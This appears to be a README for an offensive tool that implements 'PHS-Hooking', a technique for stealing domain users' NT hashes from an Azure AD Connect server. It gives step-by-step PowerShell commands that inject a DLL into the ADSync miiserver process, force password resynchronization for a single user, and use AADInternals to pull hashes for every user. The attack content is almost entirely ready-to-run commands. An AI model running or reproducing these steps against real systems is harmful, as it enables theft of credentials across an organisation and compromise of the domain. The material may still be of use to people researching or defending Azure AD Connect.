# PHS-Hooking

The Implementation of [steal domain users’ nt hashes](https://www.sygnia.co/blog/guarding-the-bridge-new-attack-vectors-in-azure-ad-connect/#9) technique (PHS-Hooking)

**PHS-Hooking** is an technique where local administrator access to an Azure AD Connect server injects code into the Password Hash Synchronization (PHS) process to capture domain users’ NT hashes before they are re-hashed for cloud synchronization. Also can force resynchronization to steal existing hashes without waiting for users to change their passwords.

<br/>

- Start ADSync Service (if not started)

```powershell
Start-Service ADSync
```
<br/>

- Inject The Payload Into The Process

```powershell
Get-Process miiserver

.\Injector.exe --process-id <pid> --inject C:\Temp\LoadCLR.dll
```
<br/>

- Get The Hash of Single User

```powershell
. .\Invoke-ForceSync.ps1
Invoke-ForceSync -Username <user> -DomainController <dc> -StartDeltaSync
```
<br/>

- Get Hashes of All Users (should use this version "AADInternals-0.9.3")

```powershell
Import-Module -Name AADInternals -RequiredVersion 0.9.3

Initialize-AADIntFullPasswordSync
```
*it may takes a few seconds to get the hash file*

